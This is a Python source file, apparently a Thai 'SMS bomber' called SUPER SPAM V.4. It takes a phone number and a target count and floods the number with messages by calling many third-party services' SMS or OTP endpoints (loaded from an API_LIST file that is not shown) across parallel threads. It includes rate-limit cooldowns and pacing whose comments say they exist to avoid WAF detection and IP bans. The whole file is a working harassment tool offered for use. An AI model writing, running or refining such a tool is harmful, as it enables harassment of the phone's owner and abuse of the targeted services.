# program/SMS-Super.py
import requests
import threading
import time
import sys
import random
from API_LIST import API_CONFIG 

# ==========================================
# COLOR & STYLE SYSTEM
# ==========================================
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    C_GREEN = Fore.GREEN + Style.BRIGHT
    C_RED = Fore.RED + Style.BRIGHT
    C_YELLOW = Fore.YELLOW + Style.BRIGHT
    C_CYAN = Fore.CYAN + Style.BRIGHT
    C_WHITE = Fore.WHITE + Style.DIM
    C_RESET = Style.RESET_ALL
except ImportError:
    C_GREEN = C_RED = C_YELLOW = C_CYAN = C_WHITE = C_RESET = ""

# ==========================================
# UTILS & TUNING
# ==========================================
MAX_THREADS = 10        # ปรับจาก 50 ให้สมดุล ไม่กระหน่ำจนระบบปลายทางติด WAF แบน IP ทันที
TIMEOUT_SEC = 8
MAX_RETRIES = 3
COOLDOWN_TIME_429 = 30  # หน่วงพัก API ที่ติด 429 เป็นเวลา 30 วินาที

lock = threading.Lock()
success_total = 0

api_fail_counts = {k: 0 for k in API_CONFIG.keys()}
api_cooldowns = {k: 0.0 for k in API_CONFIG.keys()}
banned_apis = set()

def clean_phone(phone):
    phone = "".join(filter(str.isdigit, phone.strip()))
    if phone.startswith("66"): return "0" + phone[2:]
    if phone.startswith("+66"): return "0" + phone[3:]
    return phone

def shoot_api(phone, api_key):
    global success_total
    
    if api_key in banned_apis: return

    # เช็คว่าติดคูลดาวน์อยู่หรือไม่
    with lock:
        if time.time() < api_cooldowns.get(api_key, 0):
            return

    cfg = API_CONFIG.get(api_key)
    if not cfg: return

    try:
        url = cfg["url"].format(phone=phone) if "{phone}" in cfg["url"] else cfg["url"]
        headers = cfg["headers"]()
        data_input = cfg["data"](phone) if cfg["data"] else None
        
        kwargs = {"headers": headers, "timeout": TIMEOUT_SEC}
        if isinstance(data_input, dict): kwargs["json"] = data_input
        elif isinstance(data_input, str): kwargs["data"] = data_input

        response = requests.request(cfg["method"], url, **kwargs)
        
        is_success = False
        should_ban = False
        
        if cfg.get("success_check"):
            if cfg["success_check"](response.text):
                is_success = True
        else:
            if response.status_code in (200, 201) and "error" not in response.text.lower():
                is_success = True

        if is_success:
            with lock:
                success_total += 1
                api_fail_counts[api_key] = 0
                # รีเซ็ตคูลดาวน์ให้ยิงได้ต่อเนื่อง
                api_cooldowns[api_key] = time.time() + 5
                print(f"{C_GREEN} SEND COMPLETE ({success_total}) | API: {cfg['name']}{C_RESET}")
        
        else:
            status = response.status_code
            
            # กรณีเจอ 429 (Rate Limit) -> สั่งพักเฉพาะ API นี้ชั่วคราว ไม่วนซ้ำให้โดนบล็อก
            if status == 429:
                with lock:
                    api_cooldowns[api_key] = time.time() + COOLDOWN_TIME_429
                print(f"{C_YELLOW} API {cfg['name']} rate limited (Status 429) -> Cooldown {COOLDOWN_TIME_429}s{C_RESET}")
                return 
            
            # กรณี 403 / 401 บล็อก IP ถาวร
            if status in (403, 401):
                with lock:
                    if api_key not in banned_apis:
                        print(f"{C_RED} API {cfg['name']} is banned or unauthorized (Status {status}) -> Removing from active list!{C_RESET}")
                        banned_apis.add(api_key)
                should_ban = True
            
            # กรณี 400 (เช่น เบอร์ติดจำกัดครั้งต่อชั่วโมง) -> ให้คูลดาวน์ 45 วิ แทนที่จะเตะทิ้งถาวร
            elif status == 400:
                with lock:
                    api_cooldowns[api_key] = time.time() + 45
                print(f"{C_YELLOW} API {cfg['name']} quota limit (Status 400) -> Cooldown 45s{C_RESET}")
                return

            else:
                with lock:
                    api_fail_counts[api_key] += 1
                    if api_fail_counts[api_key] >= MAX_RETRIES:
                        should_ban = True

            if should_ban:
                with lock:
                    if api_key not in banned_apis:
                        print(f"{C_RED} API {cfg['name']} BANNED (Status {status}) -> Removing from active list!{C_RESET}")
                        banned_apis.add(api_key)

    except Exception:
        with lock:
            api_fail_counts[api_key] += 1
            if api_fail_counts[api_key] >= MAX_RETRIES:
                if api_key not in banned_apis:
                    print(f"{C_RED} API {cfg['name']} CONNECTION FAILED {MAX_RETRIES} TIMES -> Removing from active list!{C_RESET}")
                    banned_apis.add(api_key)

def start_super_spam(phone, target_amount):
    print(f"\n{C_CYAN} SUPER SPAM V.4 (Smart Logic) TO: {phone}{C_RESET}")
    print(f"{C_CYAN}HIT TARGET: {target_amount} TIMES{C_RESET}")
    print(f"{C_WHITE} SYSTEM WILL REMOVE API AFTER {MAX_RETRIES} CONSECUTIVE FAILURES{C_RESET}")
    print(f"{C_WHITE} AUTO-COOLDOWN ON 429: {COOLDOWN_TIME_429} SECONDS{C_RESET}")
    print(f"{C_YELLOW}" + "-" * 50 + f"{C_RESET}")

    all_api_keys = list(API_CONFIG.keys())
    threads = []
    attempt_count = 0 
    
    while success_total < target_amount:
        # กรองตัวที่โดนแบนถาวร และตัวที่ติดคูลดาวน์ออกชั่วคราว
        now = time.time()
        active_apis = [k for k in all_api_keys if k not in banned_apis and now >= api_cooldowns.get(k, 0)]
        
        # ถ้าไม่มี API พร้อมยิงเลยเพราะติดคูลดาวน์กันหมด ให้รอสั้นๆ
        if not active_apis:
            unbanned = [k for k in all_api_keys if k not in banned_apis]
            if not unbanned:
                print(f"\n{C_RED}DON'T HAVE ANY ACTIVE APIS LEFT{C_RESET}")
                break
            time.sleep(1)
            continue

        api_key = active_apis[attempt_count % len(active_apis)]
        
        t = threading.Thread(target=shoot_api, args=(phone, api_key))
        threads.append(t)
        t.start()
        attempt_count += 1

        threads = [t for t in threads if t.is_alive()]
        while len(threads) >= MAX_THREADS:
            time.sleep(0.05)
            threads = [t for t in threads if t.is_alive()]
        
        # หน่วงสั้นๆ เพื่อไม่ให้เซิร์ฟเวอร์ปลายทางจับได้ว่าเป็นการโจมตีแบบ Flood
        time.sleep(0.2)

    for t in threads: t.join()

    print(f"{C_YELLOW}" + "-" * 50 + f"{C_RESET}")
    print(f"{C_GREEN}SUCCESS!{C_RESET}")
    print(f" HIT TARGET: {C_GREEN}{success_total}/{target_amount}{C_RESET}")
    print(f" TOTAL ATTEMPTS: {attempt_count} | ACTIVE APIS: {len([k for k in all_api_keys if k not in banned_apis])}")
    print(f" BANNED APIS: {C_RED}{len(banned_apis)}{C_RESET}")
    print(f"{C_YELLOW}" + "-" * 50 + f"{C_RESET}")

if __name__ == "__main__":
    try:
        phone_input = input(f"{C_YELLOW} Phone Number: {C_RESET}")
        clean_p = clean_phone(phone_input)
        
        if len(clean_p) != 10:
            print(f"{C_RED} Invalid phone number{C_RESET}")
            sys.exit()

        amount_input = input(f"{C_YELLOW} Number of successes desired: {C_RESET}")
        amount = int(amount_input)

        start_super_spam(clean_p, amount)
        
    except ValueError:
        print(f"{C_RED} Please enter only numbers{C_RESET}")
    except KeyboardInterrupt:
        print(f"\n{C_RED}Operation cancelled by user{C_RESET}")
